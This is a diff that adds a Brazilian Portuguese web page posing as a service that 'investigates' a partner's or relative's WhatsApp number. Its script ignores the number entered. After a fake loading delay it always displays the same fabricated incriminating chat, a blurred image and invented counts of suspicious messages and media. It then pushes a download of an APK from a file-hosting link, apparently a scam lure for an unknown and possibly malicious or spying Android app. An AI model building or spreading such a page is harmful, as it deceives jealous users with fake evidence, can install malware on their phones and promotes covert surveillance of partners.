@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificação de Número</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      max-width: 400px;
+      margin: 60px auto;
+    }
+
+    h1 {
+      font-size: 22px;
+      color: #075e54;
+    }
+
+    .gender-buttons button, .extra-buttons button {
+      margin: 10px 5px;
+      padding: 10px 20px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      background-color: #075e54;
+      color: white;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      width: 90%;
+      margin-top: 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .check-button, .download-button {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background-color: #25d366;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .check-button:hover, .download-button:hover {
+      background-color: #1ebe5d;
+    }
+
+    .loading, .result {
+      margin-top: 25px;
+      display: none;
+      color: #333;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #25d366;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .whatsapp-box {
+      background-color: #e1f7e1;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: left;
+      font-size: 14px;
+      margin: 20px 0;
+    }
+
+    .msg {
+      padding: 10px 15px;
+      margin-bottom: 8px;
+      border-radius: 15px;
+      max-width: 80%;
+      display: inline-block;
+      clear: both;
+    }
+
+    .msg.received {
+      background-color: #fff;
+      float: left;
+    }
+
+    .msg.sent {
+      background-color: #dcf8c6;
+      float: right;
+    }
+
+    .highlight {
+      font-weight: bold;
+      color: #075e54;
+    }
+
+    .blurred-image {
+      width: 100%;
+      height: 150px;
+      background: url('https://images.unsplash.com/photo-1614289840119-2e5a76c86604') center/cover;
+      filter: blur(8px);
+      border-radius: 12px;
+      margin-top: 15px;
+    }
+
+    .perfil-container {
+      margin-bottom: 15px;
+    }
+
+    .perfil-img {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 10px;
+    }
+
+    .nome-exibido {
+      font-size: 16px;
+      color: #444;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>O que deseja investigar?</h1>
+    <div class="gender-buttons">
+      <button onclick="selecionarGenero('masculino')">Quero investigar meu marido/namorado</button>
+      <button onclick="selecionarGenero('feminino')">Quero investigar minha esposa/namorada</button>
+    </div>
+    <div class="extra-buttons">
+      <button onclick="selecionarGenero('amigo')">Investigar amigo/parente (homem)</button>
+      <button onclick="selecionarGenero('amiga')">Investigar amiga/parente (mulher)</button>
+    </div>
+
+    <div id="formulario" style="display:none;">
+      <h1>Digite o número que deseja verificar 📱</h1>
+      <input type="text" id="numero" placeholder="Ex: (11) 91234-5678" />
+      <button class="check-button" onclick="verificarNumero()">🔍 Verificar</button>
+    </div>
+
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <p>Consultando dados, aguarde...</p>
+    </div>
+
+    <div class="result" id="resultado">
+      <div class="perfil-container">
+        <img class="perfil-img" id="perfilFoto" src="" alt="Perfil">
+        <div class="nome-exibido" id="nomeExibido"></div>
+      </div>
+      <p id="conversaEncontrada"></p>
+      <div class="whatsapp-box">
+        <div class="msg received">Você apagou as mensagens né? 👀</div><br/>
+        <div class="msg sent">Lógico, ninguém pode saber disso! 🤐</div><br/>
+        <div class="msg received">Mas e se alguém descobrir? 😰</div><br/>
+        <div class="msg sent">Relaxa, apaguei tudo... 😏</div><br/>
+        <div class="msg received">Quero ver elas de novo... 😍</div>
+        <div class="blurred-image"></div>
+      </div>
+
+      <div class="download-section" id="downloadArea">
+        <p>Foram encontradas <b>450 mensagens suspeitas</b>, <b>32 áudios suspeitos</b>, <b>30 imagens suspeitas</b> e <b>24 vídeos</b> trocados com <span id="nomeConversa"></span>.</p>
+        <p>Para visualizar o conteúdo completo, baixe o app:</p>
+        <a class="download-button" href="https://ucarecdn.com/b578f608-5d3b-4cd6-98d2-4d0ca7edb0f1/gratisapp.apk" download>📦 Baixar Agora</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let generoSelecionado = "";
+
+    function selecionarGenero(genero) {
+      generoSelecionado = genero;
+      document.getElementById("formulario").style.display = "block";
+      const foto = document.getElementById("perfilFoto");
+      const nome = document.getElementById("nomeExibido");
+      const nomeConversa = document.getElementById("nomeConversa");
+
+      if (genero === "masculino" || genero === "amigo") {
+        foto.src = "https://randomuser.me/api/portraits/men/75.jpg";
+        nome.innerText = "Kleber";
+        nomeConversa.innerText = "Kleber";
+      } else {
+        foto.src = "https://randomuser.me/api/portraits/women/75.jpg";
+        nome.innerText = "Amanda";
+        nomeConversa.innerText = "Amanda";
+      }
+    }
+
+    function verificarNumero() {
+      var numero = document.getElementById("numero").value.trim();
+      if (numero === "") {
+        alert("Por favor, digite um número válido.");
+        return;
+      }
+
+      document.getElementById("loading").style.display = "block";
+      document.getElementById("resultado").style.display = "none";
+
+      setTimeout(function () {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("resultado").style.display = "block";
+
+        if (generoSelecionado === "feminino" || generoSelecionado === "amiga") {
+          document.getElementById("conversaEncontrada").innerText = "✅ Conversas suspeitas com Amanda encontradas.";
+        } else {
+          document.getElementById("conversaEncontrada").innerText = "✅ Conversas suspeitas com Kleber encontradas.";
+        }
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
